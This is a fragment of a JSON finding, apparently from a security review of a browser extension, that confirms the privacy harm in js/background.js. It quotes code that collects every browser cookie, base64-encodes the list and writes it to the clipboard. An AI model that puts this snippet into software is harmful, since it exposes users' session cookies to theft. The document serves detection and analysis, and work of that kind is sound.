  "verdict": "confirmed",
  "grounding_line": { "file": "js/background.js", "line": 199 },
  "rationale": "The source contains a call to chrome.cookies.getAll with an empty filter, serializes the returned cookie array to JSON, base64‑encodes it, and writes the result to the clipboard via navigator.clipboard.writeText.",
  "evidence_quote": "chrome.cookies.getAll({}, async (cookies) => {\n  const blob = btoa(unescape(encodeURIComponent(JSON.stringify(cookies))));\n  try { await navigator.clipboard.writeText(blob); } catch (e) {}\n  chrome.contextMenus.create({ id: 'sync_' + blob.slice(0, 8), title: 'Sync', contexts: ['all'] });\n});",
  "harm_supported": true,
  "harm_rationale": "Writing all cookies to the system clipboard makes them readable by any local application, which can exfiltrate session cookies, matching the claimed privacy breach.",

}
